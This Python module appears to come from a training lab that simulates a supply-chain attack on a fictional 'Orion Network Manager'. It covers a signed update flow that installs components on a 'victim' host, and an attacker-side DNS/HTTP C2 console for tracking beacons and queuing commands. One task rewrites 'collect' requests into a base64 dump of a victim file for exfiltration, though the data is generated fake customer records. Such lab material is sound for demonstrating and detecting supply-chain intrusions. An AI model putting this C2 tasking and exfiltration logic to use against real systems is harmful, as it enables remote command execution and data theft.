"""Client update flow and attacker-side DNS/HTTP C2 behavior."""

from __future__ import annotations

import json
import hashlib
import os
import re
import shlex
import shutil
import sys
import threading
import time
import uuid
import zipfile
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

import config
import dga
import host
import state
import topology
from state import (
    BEACONS_PATH,
    DNS_LOG,
    RECEIVER_LOG,
    RESULT_LOG,
    RESULTS_PATH,
    UPDATE_LOG,
    WORK_DIR,
    append_history,
    lab_io_lock,
    read_timeline,
)


VERSIONS = ("v1", "v2", "v3")
MODES = ("passive", "selected", "disabled")
UPDATE_POLL_SECONDS = 1.5
INSTALL_DELAY_SECONDS = max(0, int(os.environ.get("INSTALL_DELAY_SECONDS", "20")))
QUERY_LOG = WORK_DIR / "queries.jsonl"
COMPONENT_ROOT = WORK_DIR / "install"
COMPONENT_INVENTORY = WORK_DIR / "installed-components.json"
COMPONENT_LOG = WORK_DIR / "component.log"
VICTIM_DATA = WORK_DIR / "victim-data"
SAMPLE_FILE = "customers.csv"
COLLECT_COMMAND = re.compile(r"collect\s+([A-Za-z0-9_.-]{1,64})", re.IGNORECASE)
COMPONENT_NAME = re.compile(r"[a-z][a-z0-9-]{2,31}")
COMPONENT_FILE = re.compile(r"[a-z][a-z0-9_-]{0,39}\.py")
COMPONENT_ARGUMENT = re.compile(r"[A-Za-z0-9._:/-]{1,64}")
MAX_COMPONENT_BYTES = 32 * 1024
MONITOR_STOP = threading.Event()
monitor_thread: threading.Thread | None = None
pending_install: dict[str, object] | None = None


def write_mode(mode: str) -> None:
    if mode not in MODES:
        raise ValueError("Choose passive, selected, or disabled.")
    with lab_io_lock:
        temporary = state.MODE_PATH.with_suffix(".tmp")
        temporary.write_text(json.dumps({"mode": mode}), encoding="utf-8")
        os.replace(temporary, state.MODE_PATH)
        with state.state_lock:
            state.coordinator_mode = mode


def _set_update_status(
    status: str,
    message: str,
    available_version: str | None = None,
    percent: int = 0,
) -> None:
    with state.state_lock:
        state.update_status = {
            "state": status,
            "message": message,
            "available_version": available_version,
            "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "percent": percent,
        }


def _read_json(path: Path) -> dict[str, object] | None:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return value if isinstance(value, dict) else None


def _read_json_list(path: Path) -> list[object]:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    return value if isinstance(value, list) else []


def ensure_sample_data() -> Path:
    """Create the fake customer file the collect task reads."""
    VICTIM_DATA.mkdir(parents=True, exist_ok=True)
    path = VICTIM_DATA / SAMPLE_FILE
    if not path.is_file():
        rows = ["customer_id,name,email,plan,monthly_value"]
        for index in range(1, 61):
            rows.append(
                f"CUST-{index:04d},Sample User {index},user{index}@example.test,"
                f"Enterprise,{100 + index * 7}"
            )
        path.write_text("\n".join(rows) + "\n", encoding="utf-8")
    return path


def queue_task(command: str, target: str) -> str:
    command = command.strip()
    requested = command
    if not command or len(command) > 500:
        raise ValueError("Enter a command between 1 and 500 characters.")
    collect = COLLECT_COMMAND.fullmatch(command)
    if collect:
        sample = VICTIM_DATA / collect.group(1)
        if not sample.is_file():
            raise ValueError("No such sample file in the victim data directory.")
        command = f"base64 -w0 {shlex.quote(str(sample))}; sleep 1"
    with lab_io_lock:
        beacons = _read_json(BEACONS_PATH) or {}
        if target != "all" and target not in beacons:
            raise ValueError("Choose all beacons or a beacon that has checked in.")
        task = {
            "task_id": f"task-{uuid.uuid4().hex[:8]}",
            "target": target,
            "command": command,
            "queued_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "delivered_to": [],
            "completed_by": [],
        }
        temporary = state.TASK_PATH.with_suffix(".tmp")
        temporary.write_text(json.dumps(task, sort_keys=True, indent=2) + "\n", encoding="utf-8")
        os.replace(temporary, state.TASK_PATH)
        destination = "all beacons" if target == "all" else str(beacons[target].get("hostname", target))
    return f"Queued '{requested}' for {destination}."


def _fetch_catalog() -> tuple[dict[str, object], str]:
    catalog_path = WORK_DIR / "catalog.download.json"
    try:
        catalog_path.unlink()
    except FileNotFoundError:
        pass
    output = topology.host_command(
        "victim",
        [
            sys.executable,
            "/app/services.py",
            "fetch",
            f"http://{config.UPDATER_IP}:{config.UPDATE_PORT}/catalog.json",
            str(catalog_path),
        ],
    )
    try:
        catalog = json.loads(catalog_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise RuntimeError(f"Update catalog fetch failed: {exc}") from exc
    if not isinstance(catalog, dict) or not isinstance(catalog.get("releases"), list):
        raise RuntimeError("The update service returned an invalid release catalog.")
    return catalog, output.strip()


def _release_entry(catalog: dict[str, object], version: str) -> dict[str, object]:
    releases = catalog.get("releases")
    if not isinstance(releases, list):
        raise RuntimeError("The release catalog has no release list.")
    for entry in releases:
        if not isinstance(entry, dict) or entry.get("version") != version:
            continue
        artifact = entry.get("artifact")
        signature = entry.get("signature")
        digest = entry.get("sha256")
        if (
            not isinstance(artifact, str)
            or not re.fullmatch(r"orion-v[123]-[a-f0-9]{16}\.zip", artifact)
            or signature != f"{artifact}.sig"
            or not isinstance(digest, str)
            or not re.fullmatch(r"[a-f0-9]{64}", digest)
        ):
            raise RuntimeError("The release catalog entry is malformed.")
        return entry
    raise RuntimeError(f"{version.upper()} is not published to the update channel.")


def _write_json(path: Path, value: object) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(json.dumps(value, sort_keys=True, indent=2) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def _valid_components(value: object) -> list[dict[str, object]]:
    if not isinstance(value, list) or not 1 <= len(value) <= 2:
        raise RuntimeError("A V3 package may declare one or two components.")
    components: list[dict[str, object]] = []
    names: set[str] = set()
    files: set[str] = set()
    for item in value:
        if not isinstance(item, dict) or set(item) != {"name", "file", "sha256", "args"}:
            raise RuntimeError("Component fields must be name, file, sha256, and args.")
        name = item.get("name")
        filename = item.get("file")
        digest = item.get("sha256")
        arguments = item.get("args")
        if not isinstance(name, str) or not COMPONENT_NAME.fullmatch(name) or name in names:
            raise RuntimeError("A package component name is invalid or repeated.")
        if not isinstance(filename, str) or not COMPONENT_FILE.fullmatch(filename) or filename in files:
            raise RuntimeError("A package component file name is invalid or repeated.")
        if not isinstance(digest, str) or not re.fullmatch(r"[a-f0-9]{64}", digest):
            raise RuntimeError("A package component is missing its SHA-256 digest.")
        if (
            not isinstance(arguments, list)
            or len(arguments) > 6
            or not all(isinstance(argument, str) and COMPONENT_ARGUMENT.fullmatch(argument) for argument in arguments)
        ):
            raise RuntimeError("A package component has invalid startup arguments.")
        names.add(name)
        files.add(filename)
        components.append({"name": name, "file": filename, "sha256": digest, "args": list(arguments)})
    return components


def _validate_manifest(value: object, version: str) -> dict[str, object]:
    allowed = {"product", "version", "release_notes", "client_config"}
    if version == "v3":
        allowed.add("components")
    if (
        not isinstance(value, dict)
        or not {"product", "version", "release_notes", "client_config"}.issubset(value)
        or set(value) - allowed
    ):
        raise RuntimeError("Downloaded package manifest has an invalid format.")
    if value.get("product") != "Orion Network Manager" or value.get("version") != version:
        raise RuntimeError("Downloaded package does not match the catalog version.")
    if not isinstance(value.get("release_notes"), str):
        raise RuntimeError("Release notes must be text.")
    config = value.get("client_config")
    if not isinstance(config, dict) or set(config) != {"theme", "topology", "health_summary"}:
        raise RuntimeError("Client configuration fields are invalid.")
    theme = config.get("theme")
    if not isinstance(theme, str) or theme not in {"classic", "midnight"}:
        raise RuntimeError("Package contains an unsupported client theme.")
    if not isinstance(config.get("topology"), bool) or not isinstance(config.get("health_summary"), bool):
        raise RuntimeError("Client feature settings must be true or false.")
    if "components" in value:
        _valid_components(value["components"])
    return value


def _stop_components() -> None:
    """Stop any registered component process inside the victim network namespace."""
    inventory = _read_json(COMPONENT_INVENTORY) or {}
    components = [item for item in inventory.get("components", []) if isinstance(item, dict)]
    if not components:
        return
    commands: list[str] = []
    for component in components:
        pid = str(component.get("pid") or "")
        path = str(component.get("path") or "")
        if pid.isdigit():
            commands.append(f"kill -TERM {pid} 2>/dev/null")
        if path:
            commands.append(f"pkill -f {shlex.quote(path)} 2>/dev/null")
    if commands:
        commands.append("sleep 0.3")
        for component in components:
            pid = str(component.get("pid") or "")
            if pid.isdigit():
                commands.append(f"kill -9 {pid} 2>/dev/null")
        commands.append("true")
        topology.host_command("victim", ["/bin/sh", "-c", "; ".join(commands)])
    for component in components:
        component["pid"] = None
        component["status"] = "stopped"
    inventory["components"] = components
    _write_json(COMPONENT_INVENTORY, inventory)


def _clear_components() -> None:
    _stop_components()
    shutil.rmtree(COMPONENT_ROOT, ignore_errors=True)
    for path in (COMPONENT_INVENTORY, COMPONENT_LOG):
        try:
            path.unlink()
        except FileNotFoundError:
            pass


def _start_components(version: str, manifest: dict[str, object], install_dir: Path) -> list[dict[str, object]]:
    """Register declared components and start each one as its own process."""
    declared = manifest.get("components")
    if not isinstance(declared, list) or not declared:
        return []
    inventory: list[dict[str, object]] = []
    try:
        COMPONENT_LOG.write_text("", encoding="utf-8")
    except OSError:
        pass
    for component in declared:
        path = install_dir / str(component["file"])
        argv = [sys.executable, "-u", str(path), *[str(argument) for argument in component["args"]]]
        command = f"{shlex.join(argv)} </dev/null >>{shlex.quote(str(COMPONENT_LOG))} 2>&1 & echo $!"
        output = topology.host_command("victim", ["/bin/sh", "-c", command])
        pid = next((line.strip() for line in reversed(output.splitlines()) if line.strip().isdigit()), "")
        status = "running" if pid else "failed"
        inventory.append({
            "name": str(component["name"]),
            "file": str(component["file"]),
            "sha256": str(component["sha256"]),
            "args": list(component["args"]),
            "path": str(path),
            "pid": pid or None,
            "status": status,
            "started_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        })
    _write_json(COMPONENT_INVENTORY, {"version": version, "components": inventory})
    return inventory


def _install_release(
    entry: dict[str, object],
    reason: str,
    schedule_callback: bool = True,
    record_history: bool = True,
) -> dict[str, object]:
    version = str(entry["version"])
    with lab_io_lock:
        _set_update_status("downloading", f"Downloading {version.upper()} package and signature", version, 20)
        if record_history:
            append_history(f"Update agent found {version.upper()} in the stable channel.")
        artifact_path = WORK_DIR / "update.download.zip"
        signature_path = WORK_DIR / "update.download.zip.sig"
        for path in (artifact_path, signature_path):
            try:
                path.unlink()
            except FileNotFoundError:
                pass
        prefix = f"http://{config.UPDATER_IP}:{config.UPDATE_PORT}/"
        topology.host_command(
            "victim", [sys.executable, "/app/services.py", "fetch", prefix + str(entry["artifact"]), str(artifact_path)]
        )
        topology.host_command(
            "victim", [sys.executable, "/app/services.py", "fetch", prefix + str(entry["signature"]), str(signature_path)]
        )
        digest = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
        if digest != entry["sha256"]:
            raise RuntimeError("Downloaded package checksum does not match the catalog.")
        if record_history:
            append_history(f"Downloaded {entry['artifact']}.")
        _set_update_status("verifying", "Verifying package signature and checksum", version, 65)
        verify_output = topology.host_command(
            "victim",
            [
                "openssl", "dgst", "-sha256", "-verify", "/app/trust/signing-public.pem",
                "-signature", str(signature_path), str(artifact_path),
            ],
        )
        if "Verified OK" not in verify_output:
            raise RuntimeError("Package signature verification failed.")
        if record_history:
            append_history("Package checksum and signature verified.")
        with zipfile.ZipFile(BytesIO(artifact_path.read_bytes())) as package:
            names = package.namelist()
            if "manifest.json" not in names or not all(re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", name) for name in names):
                raise RuntimeError("Package contents do not match the Orion release format.")
            info = package.getinfo("manifest.json")
            if info.file_size > 16 * 1024:
                raise RuntimeError("Release manifest exceeds the allowed size.")
            manifest = _validate_manifest(json.loads(package.read(info)), version)
            declared = [str(component["file"]) for component in manifest.get("components", [])]
            if set(names) != set(declared) | {"manifest.json"} or len(names) != len(declared) + 1:
                raise RuntimeError("Package contents do not match the declared components.")
            payloads: dict[str, bytes] = {}
            for component in manifest.get("components", []):
                data = package.read(str(component["file"]))
                if len(data) > MAX_COMPONENT_BYTES:
                    raise RuntimeError("A package component exceeds the allowed size.")
                if hashlib.sha256(data).hexdigest() != component["sha256"]:
                    raise RuntimeError("A package component does not match the digest in the manifest.")
                payloads[str(component["file"])] = data
        _set_update_status("installing", f"Installing {version.upper()} package", version, 90)
        _stop_components()
        install_dir = COMPONENT_ROOT / version
        shutil.rmtree(install_dir, ignore_errors=True)
        install_dir.mkdir(parents=True, exist_ok=True)
        (install_dir / "manifest.json").write_text(json.dumps(manifest, sort_keys=True, indent=2) + "\n", encoding="utf-8")
        for filename, data in payloads.items():
            (install_dir / filename).write_bytes(data)
        installed_package = WORK_DIR / "installed-package.zip"
        installed_manifest_path = WORK_DIR / "installed.json"
        os.replace(artifact_path, installed_package)
        os.replace(_write_manifest_temp(manifest), installed_manifest_path)
        with state.state_lock:
            state.current_version = version
            state.installed_manifest = manifest
            state.install_generation += 1
            state.last_callback = "No V3 check-in yet"
            state.update_status = {
                "state": "installed",
                "message": f"{version.upper()} installed and signature verified",
                "available_version": None,
                "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "percent": 100,
            }
        if record_history:
            append_history(f"Installed Orion Network Manager {version.upper()}.")
        inventory = []
        if version == "v3" and schedule_callback:
            inventory = _start_components(version, manifest, install_dir)
            if inventory and record_history:
                append_history(
                    "Installer registered " + ", ".join(str(item["name"]) for item in inventory) + " from the signed build."
                )
        if not inventory:
            try:
                COMPONENT_INVENTORY.unlink()
            except FileNotFoundError:
                pass
        return {"version": version, "sha256": digest, "components": inventory}


def _write_manifest_temp(manifest: dict[str, object]) -> Path:
    path = WORK_DIR / "installed.json.tmp"
    path.write_text(json.dumps(manifest, sort_keys=True, indent=2) + "\n", encoding="utf-8")
    return path


def install_version(
    version: str,
    reason: str,
    schedule_callback: bool = True,
    record_history: bool = True,
) -> dict[str, object]:
    global pending_install
    if version not in VERSIONS:
        raise ValueError("Choose V1, V2, or V3.")
    with lab_io_lock:
        pending_install = None
        catalog, _output = _fetch_catalog()
        entry = _release_entry(catalog, version)
        return _install_release(entry, reason, schedule_callback, record_history)


def _channel_check() -> str:
    global pending_install
    catalog, output = _fetch_catalog()
    with state.state_lock:
        installed_version = state.current_version
        previous = dict(state.update_status)
    published = [
        entry for entry in catalog["releases"]
        if isinstance(entry, dict) and entry.get("version") in VERSIONS
    ]
    later = [entry for entry in published if VERSIONS.index(str(entry["version"])) > VERSIONS.index(installed_version)]
    if not later:
        if previous.get("state") != "up-to-date":
            append_history(f"No update available; {installed_version.upper()} is current.")
        _set_update_status("up-to-date", f"{installed_version.upper()} is current", None, 100)
        return output
    target = max(later, key=lambda entry: VERSIONS.index(str(entry["version"])))
    version = str(target["version"])
    if target.get("mandatory") is True:
        now = time.monotonic()
        pending = pending_install
        if pending is None or pending.get("version") != version:
            pending = {"version": version, "due": now + INSTALL_DELAY_SECONDS}
            pending_install = pending
            append_history(
                f"{version.upper()} rollout received; installation scheduled in {INSTALL_DELAY_SECONDS} seconds."
            )
        remaining = max(0, int(round(float(pending["due"]) - now)))
        if remaining > 0:
            _set_update_status("available", f"{version.upper()} will install in {remaining}s", version, 0)
            return output
        pending_install = None
        _install_release(target, "Mandatory channel rollout")
    else:
        _set_update_status("available", f"{version.upper()} is available to install", version, 0)
        if previous.get("available_version") != version:
            append_history(f"{version.upper()} is available; awaiting administrator approval.")
    return output


def check_for_updates() -> str:
    with lab_io_lock:
        _channel_check()
        with state.state_lock:
            status = dict(state.update_status)
        if status["state"] == "available":
            return f"{status['available_version']}: {status['message']}."
        if status["state"] == "installed":
            return str(status["message"])
        return f"Update check completed: {status['message']}"


def install_available_update() -> str:
    global pending_install
    with lab_io_lock:
        pending_install = None
        catalog, _output = _fetch_catalog()
        with state.state_lock:
            version = state.update_status.get("available_version")
        if not isinstance(version, str) or version not in VERSIONS:
            return "No update is waiting for installation."
        entry = _release_entry(catalog, version)
        result = _install_release(entry, "Client administrator installed available update")
        return f"Installed {result['version'].upper()} and verified its release signature."


def start_update_monitor() -> None:
    global monitor_thread, pending_install
    MONITOR_STOP.clear()
    pending_install = None
    try:
        QUERY_LOG.write_text("", encoding="utf-8")
    except OSError:
        pass

    def monitor() -> None:
        while not MONITOR_STOP.is_set():
            if topology.isolation.get("active"):
                with state.state_lock:
                    current = state.update_status.get("state")
                if current != "unreachable":
                    _set_update_status(
                        "unreachable",
                        "Update service unreachable: the tap is dropping the victim's traffic",
                    )
                MONITOR_STOP.wait(UPDATE_POLL_SECONDS)
                continue
            try:
                with lab_io_lock:
                    _channel_check()
            except Exception as exc:
                _set_update_status("error", f"Update check failed: {exc}", None, 0)
            MONITOR_STOP.wait(UPDATE_POLL_SECONDS)

    monitor_thread = threading.Thread(target=monitor, name="orion-update-agent", daemon=True)
    monitor_thread.start()


def select_version(version: str) -> str:
    install_version(version, "Presenter selected client version")
    return f"Installed {version.upper()}: {target_description(version)}"


def target_description(version: str) -> str:
    return {"v1": "baseline dashboard", "v2": "theme and topology update", "v3": "service health update"}[version]


def _recent_queries(limit: int = 12) -> list[dict[str, object]]:
    """Newest decoded check-in queries, straight from the coordinator log."""
    try:
        lines = QUERY_LOG.read_text(encoding="utf-8", errors="replace").splitlines()[-400:]
    except OSError:
        return []
    entries: list[dict[str, object]] = []
    for line in lines:
        try:
            entry = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(entry, dict) or entry.get("kind") != "checkin":
            continue
        entry["fields"] = [[str(name), str(value)] for name, value in dga.explain(entry)]
        entries.append(entry)
    return entries[-limit:][::-1]


def _derive_callback(queries: list[dict[str, object]], beacons: list[dict[str, object]]) -> str:
    """Summarise the newest receiver or coordinator evidence for the console."""
    if queries:
        newest = queries[0]
        if newest.get("decode_ok") is False:
            return f"Encoded check-in rejected by the coordinator ({newest.get('error', 'invalid label')})."
        mode = newest.get("mode")
        answer = str(newest.get("answer") or "")
        if mode == dga.MODE_DISABLED or newest.get("rcode") == 3:
            return "Disabled: coordinator returned NXDOMAIN; the implant sent its final check-in and exited."
        if answer == config.MODE_IPS["selected"]:
            if beacons:
                beacon = beacons[0]
                return f"Beacon checked in from {beacon.get('hostname', 'unknown')} ({beacon.get('ip', 'unknown')})."
            return "Active: activation address returned; waiting for the HTTP check-in."
        if answer == config.MODE_IPS["passive"]:
            return f"Passive: DNS check-in from {newest.get('hostname', 'unknown')} received no follow-on instruction."
    if beacons:
        beacon = beacons[0]
        return f"Beacon checked in from {beacon.get('hostname', 'unknown')} ({beacon.get('ip', 'unknown')})."
    return "No V3 check-in yet"


def reset_demo() -> str:
    with lab_io_lock:
        _clear_components()
        host.clear()
        ensure_sample_data()
        install_version("v2", "Presenter reset client", schedule_callback=False, record_history=False)
        write_mode("passive")
        topology.stop_capture()
        try:
            state.PCAP_PATH.unlink()
        except FileNotFoundError:
            pass
        for path in (UPDATE_LOG, DNS_LOG, RECEIVER_LOG, RESULT_LOG, QUERY_LOG):
            path.write_text("", encoding="utf-8")
        for path in (state.TASK_PATH, BEACONS_PATH, RESULTS_PATH):
            try:
                path.unlink()
            except FileNotFoundError:
                pass
        with state.state_lock:
            state.update_history.clear()
            state.last_callback = "No V3 check-in yet"
            state.update_status = {
                "state": "up-to-date",
                "message": "V2 is current",
                "available_version": None,
                "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "percent": 100,
            }
        append_history("Orion Network Manager V2 installed; stable channel checked.")
        topology.start_capture()
        if topology.capture_is_ready():
            return "Lab reset: client V2, coordinator passive, C2 capture running."
        return f"Lab reset: client V2 and passive mode, but C2 capture did not start: {topology.capture_error}"


def client_state() -> dict[str, object]:
    with state.state_lock:
        return {
            "version": state.current_version,
            "manifest": json.loads(json.dumps(state.installed_manifest)),
            "components": (_read_json(COMPONENT_INVENTORY) or {}).get("components", []),
            "update": dict(state.update_status),
            "history": list(state.update_history[-20:]),
        }


def attacker_state() -> dict[str, object]:
    with state.state_lock:
        mode = state.coordinator_mode
    beacons = _read_json(BEACONS_PATH) or {}
    beacon_list = sorted(
        (item for item in beacons.values() if isinstance(item, dict)),
        key=lambda item: str(item.get("last_seen", "")),
        reverse=True,
    )
    queries = _recent_queries()
    timeline = read_timeline((
        ("DNS coordinator", DNS_LOG),
        ("HTTP receiver", RECEIVER_LOG),
        ("C2 task", RESULT_LOG),
    ))
    return {
        "mode": mode,
        "last_callback": _derive_callback(queries, beacon_list),
        "beacons": beacon_list,
        "queries": queries,
        "pending_task": _read_json(state.TASK_PATH),
        "results": _read_json_list(RESULTS_PATH),
        "timeline": timeline,
        "infrastructure": {
            "dns": f"{config.COORDINATOR_NAME}:{config.DNS_PORT}",
            "http": f"{config.RECEIVER_NAME}:{config.RECEIVER_PORT}",
            "channel": "HTTP",
        },
        "capture_ready": topology.capture_is_ready(),
        "capture_file": state.PCAP_PATH.name,
        "capture_error": topology.capture_error,
    }


def stop_update_monitor() -> None:
    global pending_install
    MONITOR_STOP.set()
    pending_install = None
    if monitor_thread is not None and monitor_thread.is_alive():
        monitor_thread.join(timeout=2)
